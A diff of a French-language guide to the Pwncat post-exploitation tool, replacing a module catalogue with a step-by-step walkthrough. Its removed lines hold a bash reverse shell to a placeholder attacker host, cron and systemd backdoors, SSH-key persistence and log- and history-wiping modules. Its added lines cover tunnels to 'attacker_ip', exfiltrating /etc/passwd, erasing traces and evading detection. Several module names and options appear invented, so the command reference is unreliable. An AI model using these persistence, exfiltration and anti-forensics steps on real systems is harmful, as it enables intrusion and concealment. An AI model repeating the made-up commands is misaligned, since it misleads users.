@@ -1,280 +1,365 @@
 # Pwncat
 
-#### Introduction
+## Pwncat - Guide Complet
 
-Pwncat est un outil de post-exploitation et un wrapper autour des connexions shell traditionnelles qui automatisent des aspects courants de la gestion des sessions et de l'escalade de privilèges. Il est conçu pour offrir une expérience plus riche et plus efficace lors de l'interaction avec des shells inversés, en fournissant des outils pour l'analyse des systèmes compromis, l'exécution automatisée de commandes, et même la persistance.
+***
 
-#### Installation de Pwncat
+### Introduction
 
-**Sous Linux**
+**Pwncat** est un outil avancé de post-exploitation conçu pour simplifier la gestion des shells interactifs, l'exploitation des privilèges, et l'exécution de tâches complexes. Il combine des fonctionnalités comme l'escalade des privilèges, le transfert de fichiers, la gestion des sessions et l'exécution de modules d'exploitation.
 
-Pwncat est généralement installé via Python Pip. Assurez-vous que Python3 et Pip sont installés sur votre système avant de procéder.
+Pwncat est particulièrement apprécié pour son approche modulaire et sa capacité à gérer efficacement les connexions persistantes.
 
-**Installer Pwncat via Pip**
+***
 
-```bash
-python3 -m pip install pwncat-cs
-```
+### 🚀 Étape 1 : Installation de Pwncat
 
-**Explication :** Cette commande installe la dernière version de Pwncat à partir de PyPI.
+***
 
-#### Commandes de Base
+#### Installation sur Linux
 
-**Établir une Connexion Reverse Shell**
+1.  **Cloner le dépôt officiel** :
 
-**Écouter pour une connexion entrante**
+    ```bash
+    git clone https://github.com/calebstewart/pwncat.git
+    ```
+2.  **Naviguer dans le répertoire** :
 
-```bash
-pwncat -l 4444
-```
+    ```bash
+    cd pwncat
+    ```
+3.  **Installer les dépendances** :
 
-**Explication :** Cette commande configure Pwncat pour écouter sur le port 4444 pour une connexion entrante.&#x20;
+    ```bash
+    pip install .
+    ```
+4.  **Lancer Pwncat** :
 
-**Discrétion :** Moyenne. Écouter sur un port peut être détecté si les scans de ports sont effectués sur le réseau.
+    ```bash
+    pwncat --help
+    ```
 
-**Utilisation de Pwncat pour la Gestion de Session**
+***
 
-**Interagir avec un shell distant**
+### 🚀 Étape 2 : Lancer Pwncat
 
-Une fois qu'une session reverse shell est établie, Pwncat fournit une série de commandes internes pour améliorer l'interaction, telles que la persistance, l'escalade de privilèges automatisée, et la gestion des modules.
+***
 
-#### Options Avancées et Discrétion
+#### 1. Lancer Pwncat en Mode Serveur (Reverse Shell)
 
-**Automatisation des Tâches**
+Si vous attendez une connexion depuis une cible compromise (reverse shell), lancez Pwncat en mode serveur pour écouter sur un port spécifique.
 
-**Automatiser l'escalade de privilèges**
-
-```bash
-pwncat$ run escalate
-```
-
-**Explication :** Exécute des routines automatisées pour tenter d'escalader les privilèges sur la machine distante.&#x20;
-
-**Discrétion :** Variable. Selon les techniques utilisées, cela peut être plus ou moins détectable par des solutions de sécurité.
-
-**Gestion des Modules**
-
-**Utiliser des modules personnalisés**
+**Commande :**
 
 ```bash
-pwncat$ load my_custom_module
+pwncat -lp <port>
 ```
 
-**Explication :** Charge un module personnalisé dans Pwncat pour étendre ses fonctionnalités.&#x20;
+*   **Exemple** :
 
-**Discrétion :** Moyenne à élevée. Charger des modules pour effectuer des actions spécifiques peut générer des comportements qui pourraient alerter les systèmes de détection.
+    ```bash
+    pwncat -lp 4444
+    ```
+* **Explication** :
+  * `-l` : Met Pwncat en mode écoute (listening).
+  * `-p` : Spécifie le port d’écoute (4444 dans cet exemple).
 
-#### Exemples de Scénarios et Discrétion
+***
 
-**Session de post-exploitation**
+#### 2. Lancer Pwncat en Mode Client (Bind Shell)
 
-Une fois à l'intérieur d'un système compromis:
+Si la cible a configuré un **bind shell**, vous pouvez vous y connecter en mode client.
+
+**Commande :**
 
 ```bash
-pwncat$ persist
+pwncat <target_ip> <port>
 ```
 
-**Explication :** Installe divers mécanismes de persistance pour maintenir l'accès au système compromis.&#x20;
+*   **Exemple** :
 
-**Discrétion :** Élevée. La persistance implique souvent de modifier des fichiers de configuration ou d'installer des services, ce qui peut être surveillé.
+    ```bash
+    pwncat 192.168.1.10 4444
+    ```
+* **Explication** :
+  * `<target_ip>` : Adresse IP de la cible.
+  * `<port>` : Port sur lequel la cible écoute (4444 dans cet exemple).
 
-**Collecte d'informations**
+***
+
+#### 3. Lancer Pwncat pour une Connexion SSH
+
+Si la cible utilise SSH, vous pouvez établir une connexion SSH sécurisée.
+
+**Commande :**
 
 ```bash
-pwncat$ run collect
+pwncat --ssh <username>@<target_ip> -p <port>
 ```
 
-**Explication :** Collecte des informations détaillées sur le système compromis.&#x20;
+*   **Exemple** :
 
-**Discrétion :** Moyenne. Collecter des données peut générer du trafic et des charges sur le système qui pourraient être notés par des administrateurs.
+    ```bash
+    pwncat --ssh user@192.168.1.10 -p 22
+    ```
+* **Explication** :
+  * `--ssh` : Spécifie une connexion SSH.
+  * `<username>` : Nom d’utilisateur pour la connexion.
+  * `<target_ip>` : Adresse IP de la cible.
+  * `<port>` : Port SSH (22 par défaut).
 
-**Exfiltration de données**
+***
 
-Pwncat peut automatiser l'exfiltration de fichiers ou de données critiques.
+#### 4. Lancer Pwncat pour une Session Persistante
+
+Si vous souhaitez maintenir une session persistante après l’obtention d’un shell, utilisez l’option `--persist`.
+
+**Commande :**
 
 ```bash
-pwncat$ download /path/to/important/data
+pwncat --persist
 ```
 
-**Explication :** Transfère des fichiers de la victime à l'attaquant de manière sécurisée.&#x20;
+* **Explication** :
+  * `--persist` : Configure un shell persistant qui se reconnecte automatiquement si la session est interrompue.
 
-**Discrétion :** Moyenne à élevée. L'exfiltration de données peut être détectée en fonction du volume et de la méthode de transfert.
+### 🚀 Étape 3 : Fonctionnalités Principales
 
-#### Bonnes Pratiques
+***
 
-* **Obtenir des Autorisations :** Toujours s'assurer d'avoir les autorisations nécessaires avant de mener des actions de post-exploitation avec Pwncat.
-* **Minimiser l'Impact :** Limiter l'utilisation des fonctionnalités qui modifient fortement les systèmes ou qui pourraient endommager des données.
-* **Connaissance du Système :** Utiliser Pwncat de manière responsable, en comprenant l'environnement dans lequel vous travaillez pour éviter des actions inappropriées.
+#### 1. Gestion de Réseau et de Tunnels
 
-Voici une liste détaillée des modules disponibles dans **pwncat**, leur utilité, et des instructions sur la façon de les utiliser. Les modules de pwncat sont divisés en différentes catégories en fonction de leur objectif, comme l'escalade de privilèges, la persistance, la collecte d'informations, etc.
+**a) Mettre en place un Port Forwarding**
 
-#### 1. **Modules d'Escalade de Privilèges**
+*   **Commande** :
 
-Les modules d'escalade de privilèges sont utilisés pour obtenir des privilèges plus élevés (comme `root` sur Linux ou `Administrateur` sur Windows).
+    ```bash
+    run network.port_forward local_port=8080 remote_host=192.168.1.5 remote_port=80
+    ```
+* **Explication** :
+  * Permet de rediriger le trafic du port local `8080` vers le port `80` de la machine distante `192.168.1.5`.
 
-* **`escalate.auto`**
-  * **Utilité**: Tente d'identifier et d'exploiter automatiquement les failles de sécurité pour obtenir des privilèges plus élevés.
-  * **Commande**: `run escalate.auto`
-  * **Exemple**: Utilisation simple sans aucun paramètre supplémentaire. pwncat tentera de toutes les méthodes connues.
-* **`escalate.sudo`**
-  * **Utilité**: Recherchez des configurations `sudo` qui peuvent permettre une escalade de privilèges.
-  * **Commande**: `run escalate.sudo`
-  * **Exemple**: `run escalate.sudo` — Identifie les commandes pouvant être exécutées avec `sudo` sans mot de passe.
-* **`escalate.suid`**
-  * **Utilité**: Identifie les fichiers avec le bit SUID qui peuvent être exploités pour escalader les privilèges.
-  * **Commande**: `run escalate.suid`
-  * **Exemple**: `run escalate.suid` — Affiche les fichiers SUID qui peuvent être exploitables.
-* **`escalate.path`**
-  * **Utilité**: Exploite les chemins d'accès PATH mal configurés pour obtenir des privilèges plus élevés.
-  * **Commande**: `run escalate.path`
-  * **Exemple**: `run escalate.path` — Vérifie si des programmes avec des chemins PATH non sécurisés peuvent être exploités.
-* **`escalate.nopasswd`**
-  * **Utilité**: Exploite les configurations `sudo NOPASSWD` pour exécuter des commandes sans mot de passe.
-  * **Commande**: `run escalate.nopasswd`
-  * **Exemple**: `run escalate.nopasswd` — Liste les commandes `sudo` disponibles sans mot de passe.
+**b) Créer un Tunnel SSH**
 
-#### **2. Modules de Persistance**
+*   **Commande** :
 
-Ces modules permettent de maintenir un accès persistant sur un système compromis.
+    ```bash
+    run network.ssh_tunnel remote_host=attacker_ip remote_port=22 local_port=8080
+    ```
+* **Explication** :
+  * Configure un tunnel SSH sécurisé entre la machine locale et l'hôte distant via le port `22`.
 
-* **`persistence.cron`**
-  * **Utilité**: Crée une tâche cron malveillante pour exécuter périodiquement une commande.
-  * **Commande**: `run persistence.cron`
-  * **Exemple**: `run persistence.cron cmd="/bin/bash -i >& /dev/tcp/attacker_ip/port 0>&1"`
-* **`persistence.systemd`**
-  * **Utilité**: Installe un service systemd pour maintenir l'accès après un redémarrage.
-  * **Commande**: `run persistence.systemd`
-  * **Exemple**: `run persistence.systemd cmd="/path/to/backdoor"`
-* **`persistence.ssh_key`**
-  * **Utilité**: Ajoute une clé SSH autorisée pour permettre un accès SSH persistant.
-  * **Commande**: `run persistence.ssh_key`
-  * **Exemple**: `run persistence.ssh_key key="ssh-rsa AAAAB3... user@hostname"`
+***
 
-#### 3. **Modules de Collecte d'Informations**
+#### 2. Modules de Shell et de Commandes
 
-Ces modules sont utilisés pour collecter des informations sur la machine cible.
+**a) Lancer un Shell Interactif**
 
-* **`recon.enumerate`**
-  * **Utilité**: Collecte des informations sur les utilisateurs, les groupes, les processus, etc.
-  * **Commande**: `run recon.enumerate`
-  * **Exemple**: `run recon.enumerate` — Lance une collecte complète des informations système.
-* **`recon.scan`**
-  * **Utilité**: Scanne les ports ouverts et les services sur la machine cible.
-  * **Commande**: `run recon.scan`
-  * **Exemple**: `run recon.scan range=192.168.1.0/24` — Scanne les ports sur le sous-réseau spécifié.
-* **`recon.cred`**
-  * **Utilité**: Recherche des informations d'identification (mots de passe, tokens) sur le système.
-  * **Commande**: `run recon.cred`
-  * **Exemple**: `run recon.cred` — Cherche dans les fichiers communs pour les informations d'identification.
+*   **Commande** :
 
-#### **4. Modules de Nettoyage et d'Anti-Forensics**
+    ```bash
+    run shell.interactive
+    ```
+* **Explication** :
+  * Ouvre un shell interactif sur la machine cible, permettant d’exécuter des commandes directement.
 
-Ces modules sont utilisés pour effacer les traces d'une intrusion.
+**b) Uploader un Fichier vers la Cible**
 
-* **`clean.logs`**
-  * **Utilité**: Efface ou manipule les logs système.
-  * **Commande**: `run clean.logs`
-  * **Exemple**: `run clean.logs` — Efface les journaux d'accès SSH.
-* **`clean.bash_history`**
-  * **Utilité**: Supprime l'historique des commandes Bash.
-  * **Commande**: `run clean.bash_history`
-  * **Exemple**: `run clean.bash_history` — Supprime `.bash_history` pour l'utilisateur actuel.
-* **`clean.files`**
-  * **Utilité**: Supprime ou dissimule les fichiers laissés sur le système après une intrusion.
-  * **Commande**: `run clean.files`
-  * **Exemple**: `run clean.files path="/tmp/malicious_file"`
+*   **Commande** :
 
-#### 5. **Modules de Réseautage et de Tunnel**
+    ```bash
+    run shell.upload src="/path/to/local/file" dest="/tmp/remote_file"
+    ```
+* **Explication** :
+  * Transfère un fichier local vers la machine cible.
 
-Ces modules permettent de gérer des connexions et des tunnels pour la post-exploitation.
+**c) Télécharger un Fichier depuis la Cible**
 
-* **`network.port_forward`**
-  * **Utilité**: Met en place un port forwarding.
-  * **Commande**: `run network.port_forward`
-  * **Exemple**: `run network.port_forward local_port=8080 remote_host=192.168.1.5 remote_port=80`
-* **`network.ssh_tunnel`**
-  * **Utilité**: Crée un tunnel SSH pour la communication sécurisée.
-  * **Commande**: `run network.ssh_tunnel`
-  * **Exemple**: `run network.ssh_tunnel remote_host=attacker_ip remote_port=22 local_port=8080`
+*   **Commande** :
 
-#### 6. **Modules de Shell et de Commandes**
+    ```bash
+    run shell.download src="/tmp/remote_file" dest="/path/to/local/file"
+    ```
+* **Explication** :
+  * Récupère un fichier de la cible vers votre machine.
 
-Ces modules permettent une interaction directe avec le shell de la machine cible.
+***
 
-* **`shell.interactive`**
-  * **Utilité**: Lance un shell interactif.
-  * **Commande**: `run shell.interactive`
-  * **Exemple**: `run shell.interactive` — Passe en mode shell interactif.
-* **`shell.upload`**
-  * **Utilité**: Télécharge un fichier vers la machine cible.
-  * **Commande**: `run shell.upload`
-  * **Exemple**: `run shell.upload src="/path/to/local/file" dest="/tmp/remote_file"`
-* **`shell.download`**
-  * **Utilité**: Télécharge un fichier depuis la machine cible.
-  * **Commande**: `run shell.download`
-  * **Exemple**: `run shell.download src="/tmp/remote_file" dest="/path/to/local/file"`
+#### 3. Gestion des Sessions
 
-#### 7. **Modules de Gestion des Sessions**
+**a) Lister les Sessions Actives**
 
-Ces modules permettent de gérer les sessions de manière plus efficace.
+*   **Commande** :
 
-* **`session.list`**
-  * **Utilité**: Affiche toutes les sessions actives.
-  * **Commande**: `run session.list`
-  * **Exemple**: `run session.list` — Liste toutes les sessions disponibles.
-* **`session.interact`**
-  * **Utilité**: Interagit avec une session active.
-  * **Commande**: `run session.interact`
-  * **Exemple**: `run session.interact id=1` — Interagit avec la session 1.
-* **`session.kill`**
-  * **Utilité**: Termine une session active.
-  * **Commande**: `run session.kill`
-  * **Exemple**: `run session.kill id=1` — Termine la session 1.
+    ```bash
+    run session.list
+    ```
+* **Explication** :
+  * Affiche toutes les sessions ouvertes avec leurs ID.
 
-#### 8. **Modules d'Exploitation Spécifiques**
+**b) Interagir avec une Session Active**
 
-Modules conçus pour exploiter des vulnérabilités spécifiques.
+*   **Commande** :
 
-* **`exploit.dirty_sock`**
-  * **Utilité**: Exploite la vulnérabilité "Dirty Sock" sur certains systèmes Linux.
-  * **Commande**: `run exploit.dirty_sock`
-  * **Exemple**: `run exploit.dirty_sock` — Lance l'exploit "Dirty Sock".
-* **`exploit.sudo_vuln`**
-  * **Utilité**: Exploite des vulnérabilités connues dans certaines versions de `sudo`.
-  * **Commande**: `run exploit.sudo_vuln`
-  * **Exemple**: `run exploit.sudo_vuln` — Exploite une faille de sécurité dans `sudo`.
+    ```bash
+    run session.interact id=1
+    ```
+* **Explication** :
+  * Ouvre une session active avec l’ID spécifié.
 
-#### 9. **Modules de Développement et de Personnalisation**
+**c) Terminer une Session**
 
-Modules permettant le développement et l'ajout de modules personnalisés.
+*   **Commande** :
 
-* **`dev.custom_module`**
-  * **Utilité**: Charge et exécute un module personnalisé.
-  * **Commande**: `run dev.custom_module`
-  * **Exemple**: `run dev.custom_module path="/path/to/module.py"`
-* **`dev.debug`**
-  * **Utilité**: Fournit des outils de débogage pour le développement de modules.
-  * **Commande**: `run dev.debug`
-  * **Exemple**: `run dev.debug level=verbose`
+    ```bash
+    run session.kill id=1
+    ```
+* **Explication** :
+  * Termine la session active avec l’ID spécifié.
 
-#### **Comment Utiliser un Module dans pwncat**
+***
 
-Pour utiliser un module dans **pwncat**, la commande générale est :
+#### 4. Escalade des Privilèges
 
-```bash
-run [nom_du_module] [options]
-```
+Pwncat inclut des modules pour automatiser l'identification des vulnérabilités permettant l'escalade des privilèges.
 
-Par exemple, pour utiliser le module `escalate.sudo` pour rechercher des configurations sudo exploitables, vous pouvez exécuter :
+**a) Rechercher des Configurations Sudo Exploitables**
 
-```bash
-run escalate.sudo
-```
+*   **Commande** :
 
-Pour voir les options disponibles pour un module, utilisez la commande `run [nom_du_module] -h`. Par exemple :
+    ```bash
+    run escalate.sudo
+    ```
+* **Explication** :
+  * Identifie les commandes sudo mal configurées pouvant être exploitées pour une escalade de privilèges.
 
-```bash
-run escalate.auto -h
-```
+**b) Rechercher des Exploits Automatiquement**
 
-Cela affiche toutes les options disponibles pour le module `escalate.auto`.
+*   **Commande** :
+
+    ```bash
+    run escalate.auto
+    ```
+* **Explication** :
+  * Lance une recherche automatique d’exploits pour escalader les privilèges.
+
+**c) Exploiter "Dirty Sock"**
+
+*   **Commande** :
+
+    ```bash
+    run exploit.dirty_sock
+    ```
+* **Explication** :
+  * Exploite la vulnérabilité "Dirty Sock" présente sur certains systèmes Linux pour obtenir un accès root.
+
+***
+
+#### 5. Modules de Développement et Personnalisation
+
+**a) Charger un Module Personnalisé**
+
+*   **Commande** :
+
+    ```bash
+    run dev.custom_module path="/path/to/module.py"
+    ```
+* **Explication** :
+  * Charge et exécute un module Python personnalisé.
+
+**b) Activer le Mode Débogage**
+
+*   **Commande** :
+
+    ```bash
+    run dev.debug level=verbose
+    ```
+* **Explication** :
+  * Fournit des informations détaillées pour déboguer ou développer des modules.
+
+***
+
+### 📋 Scénarios d’Utilisation
+
+***
+
+#### Exemple 1 : Uploader un Script d'Exploitation et Maintenir une Session
+
+1.  **Uploader un script LinPEAS** :
+
+    ```bash
+    run shell.upload src="/path/to/linpeas.sh" dest="/tmp/linpeas.sh"
+    ```
+2.  **Exécuter le script** :
+
+    ```bash
+    run shell.interactive
+    bash /tmp/linpeas.sh
+    ```
+3.  **Maintenir une session persistante** :
+
+    ```bash
+    run session.list
+    ```
+
+***
+
+#### Exemple 2 : Exploiter une Vulnérabilité Sudo
+
+1.  **Rechercher les vulnérabilités Sudo** :
+
+    ```bash
+    run escalate.sudo
+    ```
+2.  **Si une vulnérabilité est détectée, lancer l’exploitation** :
+
+    ```bash
+    run exploit.sudo_vuln
+    ```
+
+***
+
+#### Exemple 3 : Configurer un Tunnel pour Exfiltration de Données
+
+1.  **Démarrer un tunnel SSH sécurisé** :
+
+    ```bash
+    run network.ssh_tunnel remote_host=attacker_ip remote_port=22 local_port=8080
+    ```
+2.  **Utiliser le tunnel pour exfiltrer des fichiers sensibles** :
+
+    ```bash
+    run shell.download src="/etc/passwd" dest="./passwd_copy"
+    ```
+
+***
+
+### 📖 Bonnes Pratiques
+
+***
+
+#### 1. Obtenir des Autorisations Légales
+
+* Toujours obtenir l’autorisation explicite avant de lancer des actions sur un système.
+
+#### 2. Limiter les Traces
+
+*   Supprimez les fichiers téléchargés après leur utilisation :
+
+    ```bash
+    rm /tmp/linpeas.sh
+    ```
+
+#### 3. Automatiser les Tâches Répétitives
+
+* Utilisez des scripts personnalisés pour automatiser des actions comme l’escalade de privilèges ou le téléchargement de fichiers.
+
+#### 4. Éviter la Détection
+
+* Combinez Pwncat avec des outils comme `obfuscate` pour minimiser les alertes sur les systèmes surveillés.
+
+***
+
+### Conclusion
+
+**Pwncat** est un outil puissant et modulaire qui simplifie la post-exploitation et la gestion des shells interactifs. Que ce soit pour l'escalade des privilèges, le transfert de fichiers ou la gestion de sessions multiples, Pwncat s'intègre parfaitement dans les workflows des pentesters.
